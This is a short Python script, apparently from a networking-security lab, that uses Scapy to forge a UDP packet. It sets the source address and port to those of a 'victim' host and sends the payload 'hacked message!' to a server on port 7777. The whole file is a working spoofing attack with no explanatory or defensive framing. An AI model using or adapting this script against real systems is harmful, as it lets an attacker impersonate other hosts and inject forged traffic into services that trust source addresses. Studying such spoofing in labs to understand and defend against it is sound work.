from scapy.all import IP, UDP, send

victim_ip = "10.0.2.4"
server_ip = "10.0.2.5"
victim_port = 46627
server_port = 7777

spoofed_packet = IP(src = victim_ip, dst = server_ip) / UDP(sport = victim_port, dport=server_port) / "hacked message!"

send(spoofed_packet)

print("spoofed UDP packet sent!")


